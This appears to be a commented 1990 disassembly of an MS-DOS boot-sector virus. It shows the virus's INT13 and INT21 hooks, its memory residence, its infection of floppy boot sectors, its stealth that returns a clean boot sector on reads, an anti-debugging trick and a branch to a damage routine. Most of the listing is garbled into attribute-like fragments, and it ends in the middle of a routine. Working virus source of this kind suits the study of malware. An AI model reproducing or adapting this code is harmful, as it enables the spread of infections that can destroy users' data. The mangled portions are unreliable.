

>> AFD  print out    7-15-1990    18:51                                       < top:0100="" 5224="" dw="" 2452="" ;="" indentical="" number="" top:0102="" eb2d="" jmp="" 0131="" ;="" cold="" boot="" top:0104="" 90="" nop="" top:0105="" 90="" nop="" top:0106="" eb09="" jmp="" 0111="" ;="" warm="" boot="" top:0108="" 90="" nop="" top:0109="" 90="" nop="" top:010a="" e9ea05="" jmp="" 06f7="" ;="" attack="" top:010d="" c211="" dw="" 11c2="" ;="" end1="" top:010f="" 6e11="" dw="" 116e="" ;="" start1="" ;="" in="" the="" case="" of="" warm="" boot="" top:0111="" 5e="" *="" pop="" si="" ;="" restore="" dpt="" (int="" 1e)="" top:0112="" 1f="" pop="" ds="" ;="" saved="" in="" boot="" sector="" top:0113="" 8f04="" pop="" [si]="" top:0115="" 8f4402="" pop="" [si+02]="" top:0118="" be000f="" mov="" si,0f00="" ;="" copy="" own="" boot="" sector="" top:011b="" bf007c="" mov="" di,7c00="" ;="" to="" 0:7c00="" top:011e="" 0e="" push="" cs="" top:011f="" 1f="" pop="" ds="" top:0120="" 33c0="" xor="" ax,ax="" top:0122="" 8ec0="" mov="" es,ax="" top:0124="" b90001="" mov="" cx,0100="" top:0127="" 9c="" pushf="" top:0128="" fc="" cld="" top:0129="" f3a5="" rep="" movsw="" top:012b="" 9d="" popf="" top:012c="" ea007c0000="" jmp="" 0000:7c00="" ;="" execute="" it="" ;="" in="" the="" case="" of="" cold="" boot="" top:0131="" 33c0="" *="" xor="" ax,ax="" top:0133="" 56="" push="" si="" ;="" clear="" flags="" top:0134="" 57="" push="" di="" top:0135="" 51="" push="" cx="" top:0136="" fc="" cld="" top:0137="" bfa201="" mov="" di,01a2="" ;="" 6="" bytes="" top:013a="" bea801="" mov="" si,01a8="" top:013d="" aa="" *="" stosb="" top:013e="" 3bfe="" cmp="" di,si="" top:0140="" 72fb="" jc="" 013d="" top:0142="" 59="" pop="" cx="" top:0143="" 5f="" pop="" di="" top:0144="" 5e="" pop="" si="" top:0145="" 8ec0="" mov="" es,ax="" top:0147="" 26a14c00="" mov="" ax,es:[004c]="" ;="" save="" int13="" top:014b="" 2ea39401="" mov="" cs:[0194],ax="" top:014f="" 26a14e00="" mov="" ax,es:[004e]="" top:0153="" 2ea39601="" mov="" cs:[0196],ax="" top:0157="" b8a003="" mov="" ax,03a0="" ;="" set="" int13="" to="" top:03a0="" top:015a="" 26a34c00="" mov="" es:[004c],ax="" top:015e="" 268c0e4e00="" mov="" es:[004e],cs="" top:0163="" 26a18400="" mov="" ax,es:[0084]="" ;="" save="" int21="" top:0167="" 2ea39901="" mov="" cs:[0199],ax="" top:016b="" 26a18600="" mov="" ax,es:[0086]="" top:016f="" 2ea39b01="" mov="" cs:[019b],ax="" top:0173="" b800f0="" mov="" ax,f000="" ;="" look="" for="" reset="" vector="" top:0176="" 8ec0="" mov="" es,ax="" top:0178="" 26a0f0ff="" mov="" al,es:[fff0]="" top:017c="" 3cea="" cmp="" al,ea="" ;="" if="" not="" far="" jmp="" top:017e="" 7591="" jnz="" 0111="" ;="" jump="" to="" warm="" boot="" top:0180="" 26a1f1ff="" mov="" ax,es:[fff1]="" ;="" if="" far="" jmp="" save="" top:0184="" 2ea32c03="" mov="" cs:[032c],ax="" ;="" segment="" and="" offset="" address="" top:0188="" 26a1f3ff="" mov="" ax,es:[fff3]="" top:018c="" 2ea32e03="" mov="" cs:[032e],ax="" top:0190="" e97eff="" jmp="" 0111="" ;="" jump="" to="" warm="" boot="" top:0193="" ea1a0300c8="" jmp="" c800:031a="" ;="" int13="" original="" value="" top:0198="" ea8d139102="" jmp="" 0291:138d="" ;="" int21="" original="" value="" top:019d="" ea59ec00f0="" jmp="" f000:ec59="" ;="" int40="" original="" value="" top:01a2="" 80="" db="" 80="" ;="" flag1="" ;="" 80:="" int21="" is="" created="" top:01a3="" 00="" db="" 0="" ;="" flag2="" top:01a4="" 00="" db="" 0="" ;="" flag3="" top:01a5="" 00="" db="" 0="" ;="" flag4="" ;="" filehandle="" of="" 'command.com'="" top:01a6="" 00="" db="" 0="" ;="" flag5="" top:01a7="" 00="" db="" 0="" ;="" flag6="" ;="" 50:="" after="" int40="" is="" set="" top:01a8="" 00="" db="" 0="" top:01a9="" 00="" db="" 0="" ;="" saved="" drive="" number="" ;="" call="" original="" int13="" top:01aa="" 80fa00="" cmp="" dl,00="" ;="" check="" drive="" number="" top:01ad="" 740b="" jz="" 01ba="" top:01af="" 9c="" *="" pushf="" top:01b0="" 0e="" push="" cs="" top:01b1="" 2e8a16a901="" mov="" dl,cs:[01a9]="" ;="" call="" int13="" top:01b6="" e8daff="" call="" 0193="" ;="" call="" original="" int13="" top:01b9="" c3="" ret="" top:01ba="" 50="" *="" push="" ax="" top:01bb="" 2ea0a701="" mov="" al,cs:[01a7]="" top:01bf="" 3c50="" cmp="" al,50="" ;="" (check="" if="" int40="" is="" set)="" top:01c1="" 58="" pop="" ax="" top:01c2="" ebeb="" jmp="" 01af="" top:01c4="" 9c="" pushf="" top:01c5="" 0e="" push="" cs="" top:01c6="" e8d4ff="" call="" 019d="" top:01c9="" c3="" ret="" top:01ca="" 50="" push="" ax="" ;="" top:01cb="" 51="" push="" cx="" top:01cc="" 52="" push="" dx="" top:01cd="" 1e="" push="" ds="" top:01ce="" 33c0="" xor="" ax,ax="" ;="" save="" address="" of="" dskpartbl="" top:01d0="" 8ed8="" mov="" ds,ax="" top:01d2="" a17800="" mov="" ax,[0078]="" top:01d5="" 2ea3320a="" mov="" cs:[0a32],ax="" top:01d9="" a17a00="" mov="" ax,[007a]="" top:01dc="" 2ea3340a="" mov="" cs:[0a34],ax="" ;="" set="" address="" of="" ;="" disk="" parameter="" table="" ;="" set="" address="" of="" sector="" ;="" descriptor="" top:01e0="" 2ea00106="" mov="" al,cs:[0601]="" top:01e4="" 3c28="" cmp="" al,28="" ;="" check="" sectors/track="" top:01e6="" 7406="" jz="" 01ee="" top:01e8="" bb420a="" mov="" bx,0a42="" ;="" number="" of="" tracks="" !="0x28" top:01eb="" eb0a="" jmp="" 01f7="" top:01ed="" 90="" nop="" top:01ee="" bb8e0a="" *="" mov="" bx,0a8e="" ;="" number="" of="" tracks="0x28" top:01f1="" b9160a="" mov="" cx,0a16="" top:01f4="" eb18="" jmp="" 020e="" top:01f6="" 90="" nop="" top:01f7="" 2ea10406="" *="" mov="" ax,cs:[0604]="" top:01fb="" b9fa09="" mov="" cx,09fa="" ;="" sectors/track="0x0f" top:01fe="" 3d0f00="" cmp="" ax,000f="" top:0201="" 740b="" jz="" 020e="" top:0203="" b9080a="" mov="" cx,0a08="" top:0206="" 3d0900="" cmp="" ax,0009="" ;="" sectors/track="0x09" top:0209="" 7403="" jz="" 020e="" top:020b="" b9240a="" mov="" cx,0a24="" ;="" sectors/track="other" top:020e="" 890e7800="" *="" mov="" [0078],cx="" ;="" set="" disk="" parameter="" table="" top:0212="" 8c0e7a00="" mov="" [007a],cs="" top:0216="" 1f="" pop="" ds="" top:0217="" 5a="" pop="" dx="" top:0218="" 59="" pop="" cx="" top:0219="" 58="" pop="" ax="" top:021a="" e88dff="" call="" 01aa="" ;="" call="" original="" int13="" top:021d="" 50="" push="" ax="" ;="" restore="" disk="" parameter="" table="" top:021e="" 51="" push="" cx="" top:021f="" 52="" push="" dx="" top:0220="" 1e="" push="" ds="" top:0221="" 9c="" pushf="" top:0222="" 33c0="" xor="" ax,ax="" top:0224="" 8ed8="" mov="" ds,ax="" top:0226="" 2ea1320a="" mov="" ax,cs:[0a32]="" top:022a="" a37800="" mov="" [0078],ax="" top:022d="" 2ea1340a="" mov="" ax,cs:[0a34]="" top:0231="" a37a00="" mov="" [007a],ax="" top:0234="" 9d="" popf="" top:0235="" 1f="" pop="" ds="" top:0236="" 5a="" pop="" dx="" top:0237="" 59="" pop="" cx="" top:0238="" 58="" pop="" ax="" top:0239="" c3="" ret="" ;="" return="" top:023a="" 9c="" pushf="" ;="" call="" original="" int="" 21="" top:023b="" 0e="" push="" cs="" top:023c="" e859ff="" call="" 0198="" top:023f="" c3="" ret="" ;="" int="" 21="" entry="" point="" top:0240="" 80fc3d="" *="" cmp="" ah,3d="" ;="" open="" file="" top:0243="" 7541="" jnz="" 0286="" top:0245="" 53="" push="" bx="" ;="" save="" registers="" top:0246="" 51="" push="" cx="" top:0247="" 50="" push="" ax="" top:0248="" 52="" push="" dx="" top:0249="" 06="" push="" es="" top:024a="" 1e="" push="" ds="" top:024b="" 8bda="" mov="" bx,dx="" top:024d="" 8a07="" *="" mov="" al,[bx]="" ;="" search="" for="" end="" of="" filename="" top:024f="" 3c00="" cmp="" al,00="" top:0251="" 7403="" jz="" 0256="" top:0253="" 43="" inc="" bx="" top:0254="" ebf7="" jmp="" 024d="" top:0256="" 56="" push="" si="" ;="" compare="" filename="" to="" ;="" 'command.com'="" top:0257="" be9f03="" mov="" si,039f="" top:025a="" 4b="" dec="" bx="" top:025b="" 4e="" dec="" si="" top:025c="" b90b00="" mov="" cx,000b="" top:025f="" 8a07="" mov="" al,[bx]="" top:0261="" 0c20="" or="" al,20="" top:0263="" 2e3a04="" cmp="" al,cs:[si]="" top:0266="" 7403="" jz="" 026b="" top:0268="" e91f01="" jmp="" 038a="" top:026b="" 4e="" dec="" si="" top:026c="" 4b="" dec="" bx="" top:026d="" e2f0="" loop="" 025f="" top:026f="" 5e="" pop="" si="" ;="" the="" filename="" is="" 'command.com'="" top:0270="" 1f="" pop="" ds="" top:0271="" 07="" pop="" es="" top:0272="" 5a="" pop="" dx="" top:0273="" 58="" pop="" ax="" top:0274="" 59="" pop="" cx="" top:0275="" 5b="" pop="" bx="" top:0276="" e8c1ff="" call="" 023a="" ;="" call="" original="" int="" 21="" top:0279="" 7303="" jnc="" 027e="" ;="" return,="" if="" error="" top:027b="" ca0200="" ret="" far="" 0002="" ;="" clear="" stack="" (0002)="" top:027e="" 2ea3a501="" mov="" cs:[01a5],ax="" ;="" save="" filehandle="" top:0282="" f8="" clc="" top:0283="" ca0200="" ret="" far="" 0002="" ;="" return,="" clear="" stack="" (0002)="" top:0286="" 80fc3e="" *="" cmp="" ah,3e="" ;="" close="" file="" top:0289="" 7403="" jz="" 028e="" top:028b="" e90aff="" jmp="" 0198="" top:028e="" 2e3b1ea501="" cmp="" bx,cs:[01a5]="" ;="" check="" filehandle="" to="" ;="" command.com's="" handle="" top:0293="" 7403="" jz="" 0298="" top:0295="" e900ff="" jmp="" 0198="" ;="" jump="" to="" original="" int21="" top:0298="" 2e833ea50100="" cmp="" cs:[01a5],0000="" ;="" it's="" already="" opened="" top:029e="" 7503="" jnz="" 02a3="" top:02a0="" e9f5fe="" jmp="" 0198="" ;="" close="" 'command.com'="" top:02a3="" 2ec706a5010000="" mov="" cs:[01a5],0000="" ;="" clear="" filehandle="" top:02aa="" e88dff="" call="" 023a="" ;="" call="" original="" int21="" ;="" close="" 'command.com'="" top:02ad="" 1e="" push="" ds="" ;="" save="" register="" top:02ae="" 06="" push="" es="" top:02af="" 50="" push="" ax="" top:02b0="" 53="" push="" bx="" top:02b1="" 51="" push="" cx="" top:02b2="" 52="" push="" dx="" top:02b3="" 2ec606d00200="" mov="" cs:[02d0],00="" ;="" set="" top="" or="" not="" top="" flag="" top:02b9="" bb0002="" *="" mov="" bx,0200="" ;="" allocate="" 0x2000="" bytes="" top:02bc="" b448="" mov="" ah,48="" top:02be="" e879ff="" call="" 023a="" top:02c1="" 81fb0002="" cmp="" bx,0200="" top:02c5="" 730a="" jnc="" 02d1="" ;="" jump="" if="" no="" error="" top:02c7="" 5a="" *="" pop="" dx="" ;="" return,="" if="" error="" top:02c8="" 59="" pop="" cx="" top:02c9="" 5b="" pop="" bx="" top:02ca="" 58="" pop="" ax="" top:02cb="" 07="" pop="" es="" top:02cc="" 1f="" pop="" ds="" top:02cd="" ca0200="" ret="" far="" 0002="" top:02d0="" 01="" db="" 1="" ;="" number="" of="" probes="" for="" ;="" allocating="" memory="" top:02d1="" 50="" *="" push="" ax="" ;="" up="" to="" 3="" probe="" for="" top:02d2="" 25ff0f="" and="" ax,0fff="" ;="" allocating="" a="" segment,="" top:02d5="" 3db00d="" cmp="" ax,0db0="" ;="" which="" segment="" register="" top:02d8="" 7210="" jc="" 02ea="" ;="" &="" 0x0ffff="">< 0x0db0="" top:02da="" 58="" pop="" ax="" top:02db="" 2e803ed00203="" cmp="" cs:[02d0],03="" top:02e1="" 74e4="" jz="" 02c7="" ;="" it="" was="" the="" last="" probe="" top:02e3="" 2efe06d002="" inc="" b/cs:[02d0]="" top:02e8="" ebcf="" jmp="" 02b9="" ;="" jump="" to="" next="" probe="" top:02ea="" 58="" *="" pop="" ax="" ;="" there="" is="" a="" good="" memory="" area="" top:02eb="" 8ec0="" mov="" es,ax="" top:02ed="" 2ea3680b="" mov="" cs:[0b68],ax="" ;="" save="" segment="" register="" top:02f1="" be0000="" mov="" si,0000="" ;="" copy="" virus="" code="" to="" the="" top:02f4="" bf0000="" mov="" di,0000="" ;="" allocated="" segment="" top:02f7="" b90010="" mov="" cx,1000="" top:02fa="" 0e="" push="" cs="" top:02fb="" 1f="" pop="" ds="" top:02fc="" 9c="" pushf="" top:02fd="" fc="" cld="" top:02fe="" f3a5="" rep="" movsw="" top:0300="" 9d="" popf="" top:0301="" 33c0="" xor="" ax,ax="" ;="" clear="" ds="" register="" top:0303="" 8ed8="" mov="" ds,ax="" top:0305="" b80000="" mov="" ax,0000="" ;="" clear="" twice="" (why?)="" top:0308="" 8ed8="" mov="" ds,ax="" top:030a="" b84002="" mov="" ax,0240="" ;="" search="" cs:240="" (int21="" call)="" top:030d="" 8cca="" mov="" dx,cs="" top:030f="" bb0000="" mov="" bx,0000="" ;="" from="" 0="" to="" top:0312="" b9f0ff="" mov="" cx,fff0="" ;="" fff0="" top:0315="" e85e00="" *="" call="" 0376="" ;="" call="" search="" top:0318="" 7516="" jnz="" 0330="" top:031a="" 50="" push="" ax="" ;="" restore="" original="" int21="" vector="" top:031b="" 2ea19901="" mov="" ax,cs:[0199]="" top:031f="" 8907="" mov="" [bx],ax="" top:0321="" 2ea19b01="" mov="" ax,cs:[019b]="" top:0325="" 894702="" mov="" [bx+02],ax="" top:0328="" 58="" pop="" ax="" top:0329="" ebea="" jmp="" 0315="" ;="" search="" again="" top:032b="" ea5be000f0="" *="" jmp="" f000:e05b="" ;="" original="" value="" of="" reset="" vect.="" top:0330="" b8a003="" *="" mov="" ax,03a0="" ;="" search="" cs:03a0="" (int13="" call)="" top:0333="" 8cca="" mov="" dx,cs="" top:0335="" bb0000="" mov="" bx,0000="" ;="" from="" 0="" to="" top:0338="" b9f0ff="" mov="" cx,fff0="" ;="" fff0="" top:033b="" e83800="" *="" call="" 0376="" ;="" call="" search="" top:033e="" 7509="" jnz="" 0349="" top:0340="" 50="" push="" ax="" ;="" modify="" caller's="" segment="" top:0341="" 8cc0="" mov="" ax,es="" top:0343="" 894702="" mov="" [bx+02],ax="" top:0346="" 58="" pop="" ax="" top:0347="" ebf2="" jmp="" 033b="" ;="" search="" again="" top:0349="" b80000="" *="" mov="" ax,0000="" ;="" save="" int40="" vector="" top:034c="" 8ed8="" mov="" ds,ax="" top:034e="" a10001="" mov="" ax,[0100]="" top:0351="" 26a39e01="" mov="" es:[019e],ax="" top:0355="" a10201="" mov="" ax,[0102]="" top:0358="" 26a3a001="" mov="" es:[01a0],ax="" top:035c="" e85507="" call="" 0ab4="" top:035f="" b84504="" mov="" ax,0445="" ;="" mov="" ax,0445="" (maybe="" int40="" ;="" offset)="" top:0362="" e962ff="" jmp="" 02c7="" ;="" jump="" to="" return="" top:0365="" a30001="" mov="" [0100],ax="" ;="" set="" int40="" to="" es:ax="" top:0368="" 8cc0="" mov="" ax,es="" top:036a="" a30201="" mov="" [0102],ax="" top:036d="" 26c606a70150="" mov="" es:[01a7],50="" ;="" set="" flag6="" to="" 50="" top:0373="" e951ff="" jmp="" 02c7="" ;="" jump="" to="" return="" ;="" look="" for="" dx:ax,="" in="" ds="" segment="" ;="" from="" bx="" to="" bx+cx="" top:0376="" 50="" push="" ax="" ;="" if="" found="" z="" is="" set,="" and="" top:0377="" 52="" push="" dx="" ;="" the="" result="" is="" in="" bx="" top:0378="" 3907="" *="" cmp="" [bx],ax="" ;="" check="" [bx]="" top:037a="" 7407="" jz="" 0383="" top:037c="" 43="" *="" inc="" bx="" top:037d="" e2f9="" loop="" 0378="" top:037f="" 41="" inc="" cx="" top:0380="" 5a="" *="" pop="" dx="" top:0381="" 58="" pop="" ax="" top:0382="" c3="" ret="" top:0383="" 395702="" *="" cmp="" [bx+02],dx="" ;="" check="" [bx+02]="" top:0386="" 75f4="" jnz="" 037c="" top:0388="" ebf6="" jmp="" 0380="" top:038a="" 5e="" *="" pop="" si="" top:038b="" 1f="" pop="" ds="" top:038c="" 07="" pop="" es="" top:038d="" 5a="" pop="" dx="" top:038e="" 58="" pop="" ax="" top:038f="" 59="" pop="" cx="" top:0390="" 5b="" pop="" bx="" top:0391="" e904fe="" jmp="" 0198="" ;="" jump="" to="" original="" int="" 21="" top:0394="" 636f6d6d616e64="" 2e636f6d00="" db="" 'command.com',0="" top:03a0="" 53="" *="" push="" bx="" ;="" int13="" entry="" point="" top:03a1="" 50="" push="" ax="" top:03a2="" 51="" push="" cx="" top:03a3="" 52="" push="" dx="" top:03a4="" 06="" push="" es="" top:03a5="" 1e="" push="" ds="" top:03a6="" 57="" push="" di="" top:03a7="" 56="" push="" si="" top:03a8="" 0e="" push="" cs="" top:03a9="" 1f="" pop="" ds="" ;----------------------------------------------------------------------------="" ;="" a="" comforter="" for="" hackers="" top:03aa="" 51="" push="" cx="" ;="" save="" some="" registers="" top:03ab="" 50="" push="" ax="" top:03ac="" 52="" push="" dx="" top:03ad="" bbc203="" mov="" bx,03c2="" top:03b0="" b90200="" mov="" cx,0002="" ;="" 2="" probe="" top:03b3="" e80700="" *="" call="" 03bd="" ;="" call="" carry_or_not_?="" subrutine="" top:03b6="" 7217="" jc="" 03cf="" ;="" if="" carry="" jump="" next="" top:03b8="" e2f9="" loop="" 03b3="" top:03ba="" e96eff="" jmp="" 032b="" ;="" jump="" to="" original="" reset="" vector="" top:03bd="" b090="" mov="" al,90="" ;="" carry_or_not_?="" subrutine="" top:03bf="" f8="" clc="" top:03c0="" 8807="" mov="" [bx],al="" ;="" modify="" next="" instruction="" top:03c2="" f9="" stc="" ;="" execute="" stc,="" but="" this="" byte="" ;="" is="" 90="" (nop)="" already="" top:03c3="" 90="" nop="" ;="" now="" carry="" is="" set="" !="" (why="" top:03c4="" 90="" nop="" top:03c5="" 90="" nop="" top:03c6="" 90="" nop="" top:03c7="" 90="" nop="" top:03c8="" 90="" nop="" top:03c9="" 90="" nop="" top:03ca="" b0f9="" mov="" al,f9="" ;="" restore="" that="" instruction="" top:03cc="" 8807="" mov="" [bx],al="" top:03ce="" c3="" ret="" ;="" return="" top:03cf="" 5a="" *="" pop="" dx="" ;="" restore="" registers="" top:03d0="" 58="" pop="" ax="" top:03d1="" 59="" pop="" cx="" ;----------------------------------------------------------------------------="" top:03d2="" 2e803eb30a01="" cmp="" cs:[0ab3],01="" top:03d8="" 7503="" jnz="" 03dd="" top:03da="" e9d807="" jmp="" 0bb5="" ;="" jump="" to="" demage="" top:03dd="" 2e8816a901="" *="" mov="" cs:[01a9],dl="" ;="" save="" drive="" number="" top:03e2="" 80fc02="" cmp="" ah,02="" ;="" ah="2" or="" ah="3" (read="" or="" write)="" top:03e5="" 7215="" jc="" 03fc="" top:03e7="" 80fc04="" cmp="" ah,04="" top:03ea="" 7310="" jnc="" 03fc="" top:03ec="" 83f903="" cmp="" cx,0003="" ;="" check,="" if="" it="" is="" the="" 1.="" three="" top:03ef="" 730b="" jnc="" 03fc="" ;="" sector="" top:03f1="" 80fe00="" cmp="" dh,00="" top:03f4="" 7506="" jnz="" 03fc="" top:03f6="" 2ec606a40180="" mov="" cs:[01a4],80="" ;="" if="" it="" is="" set="" flag4="" to="" 80="" top:03fc="" 2ea0a201="" *="" mov="" al,cs:[01a2]="" ;="" check,="" if="" memory="" has="" already="" top:0400="" 3c80="" cmp="" al,80="" ;="" allocated="" top:0402="" 7420="" jz="" 0424="" top:0404="" 33c0="" xor="" ax,ax="" ;="" check="" int="" 21="" vector="" top:0406="" 8ec0="" mov="" es,ax="" top:0408="" 26a18400="" mov="" ax,es:[0084]="" top:040c="" 2e3b069901="" cmp="" ax,cs:[0199]="" ;="" if="" the="" saved="" vector="" is="" other="" top:0411="" 7403="" jz="" 0416="" ;="" than="" the="" valid="" vector="" top:0413="" e9b302="" jmp="" 06c9="" ;="" jump="" to="" creating="" int21="" top:0416="" 26a18600="" *="" mov="" ax,es:[0086]="" top:041a="" 2e3b069b01="" cmp="" ax,cs:[019b]="" top:041f="" 7403="" jz="" 0424="" top:0421="" e9a502="" jmp="" 06c9="" ;="" jump="" to="" creating="" int21="" top:0424="" 81ffaa55="" *="" cmp="" di,55aa="" ;="" if="" di="" is="" 55aa="" and="" top:0428="" 750b="" jnz="" 0435="" top:042a="" 81fea55a="" cmp="" si,5aa5="" ;="" si="" is="" 5aa5="" then="" top:042e="" 7505="" jnz="" 0435="" top:0430="" 5e="" pop="" si="" top:0431="" be5aa5="" mov="" si,a55a="" ;="" set="" si="" to="" a55a="" for="" a="" return="" top:0434="" 56="" push="" si="" ;="" value="" top:0435="" 80fa20="" *="" cmp="" dl,20="" ;="" check="" dirve="" number="" top:0438="" 720e="" jc="" 0448="" ;="" jump,="" if="" floppy="" top:043a="" 80fa80="" cmp="" dl,80="" top:043d="" 7403="" jz="" 0442="" ;="" jump,="" if="" the="" 1.="" hard="" drive="" top:043f="" e9aa02="" jmp="" 06ec="" ;="" jump,if="" other="" (nothing="" to="" do)="" top:0442="" e97b03="" *="" jmp="" 07c0="" top:0445="" e955fd="" *="" jmp="" 019d="" ;="" maybe="" int40="" entry="" point="" ;="" jump="" to="" original="" int40="" top:0448="" 2ea0a401="" *="" mov="" al,cs:[01a4]="" ;="" the="" drive="" is="" floppy="" top:044c="" 3c80="" cmp="" al,80="" top:044e="" 742e="" jz="" 047e="" top:0450="" 80fc05="" cmp="" ah,05="" ;="" check="" for="" format="" top:0453="" 7509="" jnz="" 045e="" top:0455="" 2ec606a40184="" *="" mov="" cs:[01a4],84="" top:045b="" eb0a="" jmp="" 0467="" top:045d="" 90="" nop="" top:045e="" 3c00="" *="" cmp="" al,00="" top:0460="" 7405="" jz="" 0467="" top:0462="" 2efe0ea401="" dec="" b/cs:[01a4]="" top:0467="" e99500="" *="" jmp="" 04ff="" ;-----------------------------------------------------------------------="" top:046a="" e83dfd="" call="" 01aa="" ;="" call="" original="" int13="" top:046d="" 730c="" jnc="" 047b="" top:046f="" 80fc06="" cmp="" ah,06="" ;="" if="" error="" check="" the="" errcode="" top:0472="" 7506="" jnz="" 047a="" top:0474="" 2ec606a40180="" mov="" cs:[01a4],80="" ;="" set="" flag3="" to="" 80="" if="" errcode="06" top:047a="" f9="" stc="" top:047b="" ca0200="" ret="" far="" 0002="" ;="" return="" to="" caller="" top:047e="" 2ec606a30100="" *="" mov="" cs:[01a3],00="" ;="" top:0484="" 80fc05="" cmp="" ah,05="" ;="" check="" for="" format="" top:0487="" 74cc="" jz="" 0455="" ;="" load="" the="" boot="" sector="" ;="" of="" the="" floppy="" top:0489="" b90300="" mov="" cx,0003="" ;="" probe="" 3="" times="" top:048c="" 51="" *="" push="" cx="" top:048d="" 2ec606a40100="" mov="" cs:[01a4],00="" top:0493="" bb0011="" mov="" bx,1100="" top:0496="" b80102="" mov="" ax,0201="" ;="" load="" to="" cs:1100="" top:0499="" b90100="" mov="" cx,0001="" top:049c="" ba0000="" mov="" dx,0000="" top:049f="" 0e="" push="" cs="" top:04a0="" 07="" pop="" es="" top:04a1="" e806fd="" call="" 01aa="" ;="" call="" original="" int13="" top:04a4="" 59="" pop="" cx="" top:04a5="" 7305="" jnc="" 04ac="" top:04a7="" e2e3="" loop="" 048c="" top:04a9="" e94002="" jmp="" 06ec="" ;="" jump="" to="" original="" int13="" top:04ac="" 0e="" *="" push="" cs="" ;="" search="" in="" boot="" sector="" top:04ad="" 1f="" pop="" ds="" top:04ae="" bb0011="" mov="" bx,1100="" top:04b1="" b90002="" mov="" cx,0200="" top:04b4="" b8fbcd="" mov="" ax,cdfb="" ;="" search:="" fb="" cd="" 13="" 72="" top:04b7="" ba1372="" mov="" dx,7213="" top:04ba="" e8b9fe="" call="" 0376="" top:04bd="" 7403="" jz="" 04c2="" ;="" if="" not="" found="" top:04bf="" e92a02="" jmp="" 06ec="" ;="" jump="" to="" original="" int13="" top:04c2="" 2ec606fd0401="" mov="" cs:[04fd],01="" ;="" if="" found,="" remember="" it="" top:04c8="" 8b4705="" mov="" ax,[bx+05]="" top:04cb="" 3dcd12="" cmp="" ax,12cd="" ;="" check,="" if="" the="" floppy="" has="" ;="" infected="" top:04ce="" 2e891e9309="" mov="" cs:[0993],bx="" ;="" save="" the="" search="" string="" place="" top:04d3="" 2ec70602060803="" mov="" cs:[0602],0308="" top:04da="" 7403="" jz="" 04df="" top:04dc="" e9be00="" jmp="" 059d="" ;="" jump="" to="" infection="" top:04df="" 2e8a871700="" *="" mov="" al,cs:[bx+0017]="" ;="" load="" version="" of="" that="" virus="" top:04e4="" 3c17="" cmp="" al,17="" ;="" check="" it="" top:04e6="" 750b="" jnz="" 04f3="" top:04e8="" 2e8b871800="" mov="" ax,cs:[bx+0018]="" top:04ed="" 3b068e07="" cmp="" ax,[078e]="" top:04f1="" 730c="" jnc="" 04ff="" top:04f3="" 2ec70602060703="" mov="" cs:[0602],0307="" top:04fa="" e9a000="" jmp="" 059d="" ;="" jump="" to="" infection="" top:04fd="" 0100="" dw="" 1="" ;="" flag_4fd="" ;="" 0:="" no="" infection="" ;="" 1:="" infection="" top:04ff="" 5e="" *="" pop="" si="" top:0500="" 5f="" pop="" di="" top:0501="" 1f="" pop="" ds="" top:0502="" 07="" pop="" es="" top:0503="" 5a="" pop="" dx="" top:0504="" 59="" pop="" cx="" top:0505="" 58="" pop="" ax="" top:0506="" 5b="" pop="" bx="" top:0507="" 80fe00="" cmp="" dh,00="" ;="" check="" for="" r/w="" the="" 1st="" sector="" top:050a="" 7403="" jz="" 050f="" top:050c="" e95bff="" jmp="" 046a="" top:050f="" 83f901="" *="" cmp="" cx,0001="" top:0512="" 7403="" jz="" 0517="" top:0514="" e953ff="" jmp="" 046a="" top:0517="" 80fc02="" *="" cmp="" ah,02="" top:051a="" 7408="" jz="" 0524="" top:051c="" 80fc03="" cmp="" ah,03="" top:051f="" 7423="" jz="" 0544="" top:0521="" e946ff="" jmp="" 046a="" ;="" jump,="" if="" not="" the="" 1st="" sect="" r/w="" top:0524="" e883fc="" *="" call="" 01aa="" ;="" read="" the="" absolut="" 1st="" sector="" top:0527="" 7303="" jnc="" 052c="" top:0529="" e943ff="" jmp="" 046f="" top:052c="" 2e803ea20180="" cmp="" cs:[01a2],80="" ;="" check="" flag1="" top:0532="" 7403="" jz="" 0537="" ;="" jump,="" if="" 80="" top:0534="" e933ff="" jmp="" 046a="" top:0537="" 56="" *="" push="" si="" top:0538="" 9c="" pushf="" top:0539="" be9509="" mov="" si,0995="" ;="" address="" of="" the="" correct="" boot="" ;="" sector's="" part="" top:053c="" e83b00="" call="" 057a="" ;="" copy="" correct="" boot="" sector's="" top:053f="" 9d="" popf="" ;="" part="" to="" the="" es:bx="" buffer="" top:0540="" 5e="" pop="" si="" top:0541="" e937ff="" jmp="" 047b="" ;="" jump="" to="" return="" to="" caller="" top:0544="" 2e803efd0401="" *="" cmp="" cs:[04fd],01="" ;="" write="" the="" absolut="" 1st="" sector="" top:054a="" 7403="" jz="" 054f="" ;="" if="" flag_4fd="" is="" 0="" -="">
TOP:054C  EB20           JMP    056E            ;  not change
TOP:054E  90             NOP
TOP:054F  2EC606FD0400 * MOV    CS:[04FD],00
TOP:0555  53             PUSH   BX
TOP:0556  50             PUSH   AX
TOP:0557  51             PUSH   CX
TOP:0558  52             PUSH   DX
TOP:0559  06             PUSH   ES
TOP:055A  1E             PUSH   DS
TOP:055B  57             PUSH   DI
TOP:055C  56             PUSH   SI
TOP:055D  06             PUSH   ES
TOP:055E  1F             POP    DS
TOP:055F  0E             PUSH   CS
TOP:0560  07             POP    ES
TOP:0561  B90002         MOV    CX,0200         ; Copy the sector to CS:1100
TOP:0564  8BF3           MOV    SI,BX
TOP:0566  BF0011         MOV    DI,1100
TOP:0569  F3A4           REP    MOVSB
TOP:056B  EB46           JMP    05B3            ; Jump
TOP:056D  90             NOP


TOP:056E  5B           * POP    BX              ; Restore registers
TOP:056F  59             POP    CX
TOP:0570  59             POP    CX
TOP:0571  5A             POP    DX
TOP:0572  07             POP    ES
TOP:0573  1F             POP    DS
TOP:0574  5F             POP    DI
TOP:0575  5E             POP    SI
TOP:0576  F8             CLC
TOP:0577  E901FF         JMP    047B            ; Jump to return to caller

TOP:057A  53             PUSH   BX              ; Copy block from CS:SI
TOP:057B  50             PUSH   AX              ;  to ES:BX+(CS:[0993])
TOP:057C  51             PUSH   CX
TOP:057D  52             PUSH   DX              ; If SI=995, it will copy
TOP:057E  57             PUSH   DI              ;  a part of a correct boot
TOP:057F  1E             PUSH   DS              ;  sector
TOP:0580  0E             PUSH   CS
TOP:0581  1F             POP    DS
TOP:0582  2EA19309       MOV    AX,CS:[0993]    ; Where the indentical string
                                                ;  found
TOP:0586  25FF00         AND    AX,00FF         ; Compute destination
TOP:0589  03D8           ADD    BX,AX
TOP:058B  8BFB           MOV    DI,BX
TOP:058D  B95900         MOV    CX,0059         ; Number of bytes
TOP:0590  9C             PUSHF
TOP:0591  FC             CLD
